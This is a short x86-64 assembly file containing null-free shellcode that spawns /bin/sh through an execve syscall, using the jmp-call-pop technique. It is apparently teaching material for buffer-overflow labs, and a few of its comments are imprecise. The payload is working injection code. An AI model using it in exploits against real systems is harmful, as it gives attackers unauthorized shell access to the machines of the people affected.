section .text
  global _start
    _start:
	BITS 64
	jmp short two
    one:
 	pop rbx           

 	mov [rbx+8],  rbx  ; store rbx to memory at address rbx + 8
	xor rax,rax      ; rax = 0
 	mov [rbx+16], rax  ; store rax to memory at address rbx + 16	  
        xor al,al
        mov [rbx+7],al
        mov rdi, rbx       ; rdi = rbx
 	lea rsi, [rbx+8]   ; rsi = rbx + 8    
        
        xor rdx,rdx      ; rdx = 0
 	xor rax,rax        ; rax = 59
 	mov al,59
        syscall
     two:
        call one                                                                   
        db '/bin/sh', 0xff ; The command string (terminated by a zero)
        db 'AAAAAAAA'      ; Place holder for argv[0] 
        db 'BBBBBBBB'      ; Place holder for argv[1]
